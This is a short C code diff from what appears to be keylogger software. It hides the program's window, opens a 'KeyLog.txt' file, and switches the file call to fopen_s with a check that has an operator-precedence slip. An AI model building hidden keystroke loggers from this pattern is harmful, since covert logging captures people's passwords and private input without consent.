@@ -5,8 +5,11 @@ int main(void)
     hideWindow();
 
     FILE    *LogFile;
+    errno_t err;
 
-    LogFile = fopen("C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");
+    if (err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+") != 0)
+        return 1;
+
 
     return 0;
 }
